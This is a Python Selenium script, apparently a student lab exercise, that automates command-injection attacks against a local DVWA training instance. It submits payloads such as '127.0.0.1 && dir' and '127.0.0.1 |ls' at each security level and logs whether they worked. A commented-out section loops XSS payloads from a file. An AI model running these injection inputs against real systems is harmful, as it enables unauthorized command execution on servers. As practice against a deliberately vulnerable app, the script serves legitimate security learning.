import threading 
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import pyautogui
import time
import log
URL = "http://localhost/dvwa"
ADMIN = "admin"
PASSWORD = "password"

def login(level):

    # level == 1 : low
    # level == 2 : medium
    # level == 3 : high
    # level == 4 : impossible

    option = webdriver.ChromeOptions()
    option.headless = False
    prefs = {"profile.default_content_setting_values.notifications" : 2}
    option.add_experimental_option("prefs", prefs)
    option.add_experimental_option('excludeSwitches', ['enable-logging'])
    option.add_argument("--disable-notifications")
    global driver
    driver = webdriver.Chrome("./chromedriver.exe", chrome_options=option)

    driver.get(URL)
    admin = driver.find_element_by_xpath("/html/body/div/div[2]/form/fieldset/input[1]")
    admin.send_keys(ADMIN)
    passwd = driver.find_element_by_xpath("/html/body/div/div[2]/form/fieldset/input[2]")
    passwd.send_keys(PASSWORD)
    passwd.send_keys(Keys.ENTER)
    time.sleep(0.5) 
    driver.get("http://localhost/dvwa/security.php")
    select = driver.find_element_by_xpath("/html/body/div/div[3]/div/form/select")
    select.click()
    for i in range(4 - level):
        select.send_keys(Keys.ARROW_UP)
    select.send_keys(Keys.ENTER)
    
    driver.find_element_by_xpath('/html/body/div/div[3]/div/form/input[1]').click()
    time.sleep(0.5)
    # print(driver.get_cookies())


def command_inj(option, level, level_login):
    if (1 > level_login) or (4 < level_login):
        log.write_log('301 NOT', 'COMMAND_INJECTION || ' , "Chưa chọn mức độ phòng thủ")
        return
    login(level_login)
    driver.get("http://localhost/dvwa/vulnerabilities/exec/")
    input = driver.find_element_by_xpath('/html/body/div/div[3]/div/div/form/p/input[1]')
    command = ""
    if level == 1:
        if option == 'win':
            command = "127.0.0.1 && dir"
        else :
            command = '127.0.0.1 && ls'
    elif level == 2:
        if option == 'win':
            command = "127.0.0.1 & dir"
        else :
            command = '127.0.0.1 & ls'
    elif level == 3:
        if option == 'win':
            command = "127.0.0.1 |dir"
        else :
            command = '127.0.0.1 |ls'
    elif level == 4:
        if option == 'win':
            command = "127.0.0.1 |dir"
        else :
            command = '127.0.0.1 |ls'
    else:
        log.write_log('300 NOT', 'COMMAND_INJECTION || ' + command, "Chưa chọn mức độ tấn công")
        driver.close()
        return
    input.send_keys(command)
    input.send_keys(Keys.ENTER)
    time.sleep(0.5)
    try:
        result = driver.find_element_by_xpath('/html/body/div/div[3]/div/div/pre')
        text_result = result.text
        info_dir = text_result.split('Average = 0ms')
        if(len(info_dir[1])) :
            log.write_log('200 OK', 'COMMAND_INJECTION || ' + command, info_dir[1])
        else:
            log.write_log('400 NOT', 'COMMAND_INJECTION || ' + command, 'Tấn công thất bại')
    except:
        if 'Bad parameter dir' not in result.text :
            log.write_log('500 WARNING', 'COMMAND_INJECTION || ' + command, result.text)
        else:
            log.write_log('400 NOT', 'COMMAND_INJECTION || ' + command, 'Tấn công thất bại')
    driver.close()

command_inj('win', 1, 5)













def xss_dvwa(left, right, url, level):

    # driver.get("http://localhost/dvwa/security.php")
    # driver.find_element_by_xpath("/html/body/div/div[3]/div/form/select").click()
    # driver.find_element_by_xpath("/html/body/div/div[3]/div/form/select/option[1]").click()
    # pyautogui.keyUp()
    time.sleep(3000)

    driver.find_element_by_xpath("/html/body/div/div[3]/div/form/input[1]").click()
    driver.close()

# xss_dvwa(0,1, URL,1)
    # f = open("./XSS.txt", 'r' , encoding="utf-8") 
    
    # for line in f:
    #     count += 1
    #     if count < left or count > right: continue
    #     url1 = url + line
    #     driver.get(url1)
    #     time.sleep(1)
    #     try:
    #         text = driver.find_element_by_xpath('/html/body/div[2]/div/fieldset/h2')
    #         if "403 - Forbidden: Access"  in text.text :
    #             print(line)
    #         else:
    #             continue
    #     except :
    #         continue
            
# t1 = threading.Thread(target=xss, args=(0,25))
# t2 = threading.Thread(target=xss, args=(26,50))
# t3 = threading.Thread(target=xss, args=(51,100))
# # starting thread 1
# t1.start()
# # starting thread 2
# t2.start()
# t3.start()
# # wait until thread 1 is completely executed
# t1.join()
# # wait until thread 2 is completely executed
# t2.join()
# t3.join()
# print("Done!")